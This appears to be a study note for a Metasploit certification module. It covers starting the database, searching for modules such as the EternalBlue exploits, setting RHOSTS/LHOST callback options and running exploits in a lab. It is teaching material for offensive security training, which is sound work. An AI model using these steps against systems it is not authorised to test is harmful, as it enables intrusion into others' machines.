---
tags: [jcu, module1, metasploit]
jqr: "Module 1 — Metasploit framework workflow: DB init/status, msfconsole, search → use → show → set → run/exploit"
---

# Metasploit Workflow

The spine of every Metasploit task: bring the database up, find a module, load it, fill in the options, run it. Memorise this loop and 80% of the Metasploit JQR is muscle memory.

> 🧪 **Run this on your lab (Kali 2026.2)** — verified against current docs; there is no live MSF output in the study sandbox, so confirm exact banners/counts on your own box.

## TL;DR

```text
sudo msfdb init                       # first run: create + start the PostgreSQL backend
msfconsole -q                         # launch console (-q = no banner)
db_status                             # MUST say: Connected ... postgresql
search type:exploit cve:2017-0144     # find a module (filters below)
use 0                                 # load by result index  (or: use <full/path>)
show options                          # what must I set? (Required = yes)
set RHOSTS 192.168.1.20               # the TARGET (note the plural S)
set LHOST 192.168.1.10                # YOUR Kali IP (payload calls back here)
run                                   # scanner or exploit  (exploit = alias for exploit modules)
```

## Concept

Metasploit is a **framework**, not one tool. Five parts do all the work:

| Term | What it is | Defender analogy |
|---|---|---|
| **Module** | A packaged capability (exploit, scanner, post, payload) | A "signature", but offensive |
| **Exploit** | Code that abuses a vuln to run *your* code | The break-in method |
| **Payload** | Code that runs *after* the exploit lands (e.g. a shell) | The implant / C2 stub |
| **Handler** | Waits on your Kali box to catch the payload calling home | The C2 server |
| **Session** | The live connection to a compromised host | The active foothold |

**How the five fit together:** picture one break-in as a delivery. The **exploit** is the trick that gets a foot in the door; the **payload** is the package it carries — the code that actually runs on the target; the **handler** is you back home, waiting by the phone for that package to call and say "I'm in"; the **session** is the open line you then talk over. Swap any one part without rebuilding the others — that interchangeability *is* what "framework" means here: a common chassis you bolt different exploits, payloads, and handlers onto.

**Exploitation** = getting *in* (initial code execution). **Privilege escalation** = getting *higher* once inside. Metasploit does both — see [Privilege Escalation Concepts](../../Knowledge%20Req/Privilege%20Escalation%20Concepts.md).

**Why the database matters** (exam favourite): the PostgreSQL backend indexes module metadata so `search` is fast, and it stores `hosts` / `services` / `creds` / `loot` / `notes` in per-engagement **workspaces**. `db_nmap` and `hosts -R` (auto-fill RHOSTS) only work when the DB is connected.

## 1. Start Metasploit — database FIRST

```bash
sudo msfdb init                    # first time only: create + start the msf PostgreSQL database
sudo systemctl start postgresql    # ensure the PostgreSQL server is up
sudo msfdb start                   # start the msf database (also: msfdb status / msfdb reinit)
msfconsole                         # launch the console (-q skips the banner)
```

Inside the console, verify the connection:

```text
msf6 > db_status
[*] Connected to msf. Connection type: postgresql.
```
→ Anything other than "Connected ... postgresql" means search is slow and `hosts`/`services` won't populate. Fix the DB before continuing.

**One-liner:** `sudo msfdb run` starts the DB *and* drops you into `msfconsole`.

## 2. msfconsole basics

```text
help                 # list console commands (help <cmd> for one)
banner ; version     # fresh banner + module counts / framework version

# Workspaces — per-engagement data separation
workspace            # list (* = current)
workspace -a lab01   # add and switch to a new workspace
workspace -d lab01   # delete a workspace

# Stored data (populated by db_nmap / scanners / exploits)
hosts                # discovered hosts
hosts -R             # push all stored hosts into RHOSTS for the loaded module
services -p 445      # discovered services, filtered by port

# Scan straight into the database
db_nmap -sV -p 445 192.168.1.20   # normal nmap flags; results auto-stored in hosts/services
```
> **Why workspaces:** one flat pile of hosts and creds across ten jobs is both a mess and a scoping hazard. A workspace per engagement keeps each target's hosts/services/loot filed under the right job — the offensive equivalent of not mixing two clients' evidence.

→ `db_nmap` = ordinary [Nmap](../../Recon%20Tools/Nmap.md), but the output lands in the DB automatically.

## 3. SEARCH — find modules

```text
search type:auxiliary smb                    # auxiliary (scanner/etc.) modules touching SMB
search type:exploit platform:windows smb     # Windows SMB exploits only
search eternalblue                           # free-text name search
search cve:2017-0144                         # by CVE (returns the MS17-010 modules)
```

Filters worth memorising:

| Filter | Meaning | Example |
|---|---|---|
| `type:` | Module class | `type:exploit`, `type:auxiliary`, `type:post`, `type:payload` |
| `platform:` | Target OS | `platform:windows`, `platform:linux` |
| `cve:` | Vulnerability ID | `cve:2017-0144` |
| `rank:` | Reliability/quality | `rank:excellent`, `rank:great` |
| `name:` | Text in module name | `name:psexec` |
| `path:` | Text in module path | `path:scanner/smb` |
| `author:` | Module author | `author:hdm` |

→ Combine freely: `search type:exploit platform:windows rank:excellent smb`.

## 4. USE — load a module (two ways)

```text
# By index (the # column from the last search table) — fast but the row number shifts
use 0

# By full path — deterministic; best for exam answers and scripts
use auxiliary/scanner/smb/smb_version
```
→ After `use 0`, always glance at the module path msf prints back. `back` unloads the current module; `previous` returns to the one before.

## 5. SHOW — inspect a loaded module

```text
show options     # required + optional datastore settings   (alias: options)
show advanced    # advanced options (e.g. SMB::ProtocolVersion, timeouts, SSL)
show payloads    # payloads compatible with THIS exploit/target
show targets     # target profiles (OS/arch/technique) the exploit supports
info             # full description, options, references, CVEs
```
→ Read the `Required = yes` rows in `show options` — those are what you must fill in. Wrong `show targets` index is a top cause of a "successful" exploit that opens no session (`set TARGET <n>` to change).

## 6. SET — configure the module

```text
set RHOSTS 192.168.1.20     # REMOTE host = the TARGET (plural S; accepts ranges/CIDR/file:)
set RPORT 445               # REMOTE port on the target (SMB = 445)
set LHOST 192.168.1.10      # LOCAL host = YOUR Kali IP (payload callback address)
set LPORT 4444              # LOCAL port your handler listens on

set SMBUser administrator   # creds for authenticated modules (name varies per module)
set SMBPass Lab-Passw0rd!   # placeholder only — never store real creds in notes
```
→ `unset RHOSTS` clears one option back to default.

> [!tip] `set` vs `setg` (global)
> `setg LHOST 192.168.1.10` sets a value **globally** so it survives `use` of a different module — perfect for LHOST/RHOSTS you reuse all engagement. `unsetg` clears it; `save` writes globals to `~/.msf4/`.

## 7. RUN vs EXPLOIT — execute

```text
run          # run any module (auxiliary scanners AND exploits)
exploit      # alias of run, conventionally used for exploit modules
run -j       # run in the background as a job (exploit -j) — frees the console
exploit -z   # run but don't auto-interact with the new session
```
→ Auxiliary scanner → `run`. Exploit → `exploit` (or `run`). On success you'll see `Meterpreter session 1 opened ...` — jump to [Meterpreter](Meterpreter.md). Manage backgrounded work with `jobs` and `sessions`.

## Exam tips & gotchas

- **DB must be connected** for fast search + stored hosts/services. `db_status` should say *Connected ... postgresql*; if not, `sudo msfdb init` / start PostgreSQL and relaunch.
- **`RHOSTS` (plural), not `RHOST`.** Modern modules use `RHOSTS` (ranges/CIDR/`file:`). Setting the wrong one silently leaves the target blank. `hosts -R` auto-fills it.
- **`LHOST` = your attacker IP on the *right* interface.** On a VPN'd CTF use your `tun0` IP, not `eth0` — check `ip a`. Wrong LHOST = the payload never calls back.
- **Prefer the full module path** in write-ups; `use <index>` breaks when the search table reorders.
- **`search cve:` and `search rank:excellent`** cut noisy results fast.
- **`run -j`** backgrounds a handler/scanner so the console stays usable.

## References

- Metasploit documentation (home) — https://docs.metasploit.com/
- Metasploit Unleashed (free course) — https://www.offsec.com/metasploit-unleashed/
- Metasploit SMB pentesting guide — https://docs.metasploit.com/docs/pentesting/metasploit-guide-smb.html
- `multi/handler` module (Rapid7 DB) — https://www.rapid7.com/db/modules/exploit/multi/handler/
- Exploit-DB / `searchsploit` (find a PoC when no MSF module exists) — https://www.exploit-db.com/searchsploit

## Related

- [MSFvenom](MSFvenom.md)
- [Meterpreter](Meterpreter.md)
- [SMB PsExec and DCOM](SMB%20PsExec%20and%20DCOM.md)
- [Nmap](../../Recon%20Tools/Nmap.md)
- [Common Software Vulnerabilities](../../Knowledge%20Req/Common%20Software%20Vulnerabilities.md)
